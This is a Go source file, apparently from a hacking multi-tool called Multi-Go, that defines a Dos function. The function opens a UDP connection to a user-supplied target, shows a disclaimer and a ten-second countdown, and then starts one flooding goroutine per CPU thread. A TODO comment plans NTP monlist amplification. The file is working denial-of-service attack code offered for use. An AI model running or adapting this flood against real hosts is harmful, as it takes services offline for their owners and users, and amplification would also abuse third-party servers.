package tasks

/*
   Copyright 2018 TheRedSpy15

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

import (
	"fmt"
	"github.com/TheRedSpy15/Multi-Go/utils"
	"github.com/daviddengcn/go-colortext"
	"github.com/shirou/gopsutil/cpu"
	"net"
	"time"
)

// Dos indefinitely sends data to target
// TODO: add amplification - such as NTP monlist
func Dos(target string) {
	utils.CheckTarget(target) // make sure target is valid

	conn, err := net.Dial("udp", target) // setup connection object
	defer conn.Close()                   // make sure to close connection when finished
	if err != nil {
		ct.Foreground(ct.Red, true) // sets text color to bright red
		panic(err.Error)
	} else { // nothing bad happened when connecting to target
		ct.Foreground(ct.Green, true) // ets text color to bright red
		fmt.Println("Checks passed!")
	}

	ct.Foreground(ct.Red, true)                                            // set text color to bright red
	fmt.Println("\nWarning: you are solely responsible for your actions!") // disclaimer
	fmt.Println("ctrl + c to cancel")
	fmt.Println("\n10 seconds until DOS")
	ct.ResetColor() // reset text color to default

	time.Sleep(10 * time.Second) // 10 second delay - give chance to cancel

	threads, err := cpu.Counts(false) // get threads on system to set DOS thread limit
	if err != nil {
		ct.Foreground(ct.Red, true) // set text color to bright red
		panic(err.Error())
	}

	for i := 0; i < threads; i++ { // create DOS threads within limit
		go utils.Dos(conn)             // create thread
		ct.Foreground(ct.Yellow, true) // set text color to dark yellow
		fmt.Println("Thread created!")
	}
}
